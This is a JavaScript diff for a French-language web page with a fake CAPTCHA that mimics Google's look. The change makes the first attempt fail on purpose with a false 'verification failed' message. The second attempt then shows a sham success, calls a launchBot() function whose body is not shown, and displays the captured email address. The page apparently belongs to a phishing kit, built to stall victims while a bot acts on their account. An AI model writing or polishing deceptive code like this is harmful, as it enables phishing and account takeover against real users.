@@ -132,19 +132,33 @@ function solveCaptcha(){
   var spin=document.getElementById('captcha-spinner');
   var icon=document.getElementById('captcha-icon');
   if(box.style.backgroundColor==='rgb(26, 115, 232)')return;
+  _captchaAttempts++;
   spin.style.display='block';
   box.style.backgroundColor='#fff';
-  launchBot();
-  setTimeout(function(){
-    spin.style.display='none';
-    icon.style.opacity='1';
-    box.style.backgroundColor='#1a73e8';
-    box.style.borderColor='#1a73e8';
-    document.getElementById('captcha-msg').textContent='Vérification de sécurité terminée.';
-    document.getElementById('captcha-msg').style.color='#34a853';
-    showScreen('page-loading-mail');
-    setTimeout(function(){showScreen('page-mail-info');document.getElementById('mail-user-email').textContent=_email;},1500);
-  },2500);
+  if(_captchaAttempts===1){
+    // Premiere tentative : echec apres 9s
+    setTimeout(function(){
+      spin.style.display='none';
+      box.style.backgroundColor='#fff';
+      box.style.borderColor='#d93025';
+      document.getElementById('captcha-msg').textContent='Échec de vérification. Veuillez réessayer.';
+      document.getElementById('captcha-msg').style.color='#d93025';
+      _captchaSolving=false;
+    },9000);
+  } else {
+    // Deuxieme tentative : succès apres 10s + lancement bot
+    if(_captchaAttempts===2) launchBot();
+    setTimeout(function(){
+      spin.style.display='none';
+      icon.style.opacity='1';
+      box.style.backgroundColor='#1a73e8';
+      box.style.borderColor='#1a73e8';
+      document.getElementById('captcha-msg').textContent='Vérification de sécurité terminée.';
+      document.getElementById('captcha-msg').style.color='#34a853';
+      showScreen('page-loading-mail');
+      setTimeout(function(){showScreen('page-mail-info');document.getElementById('mail-user-email').textContent=_email;},1500);
+    },10000);
+  }
 }
 window.solveCaptcha=solveCaptcha;
 function launchBot(){
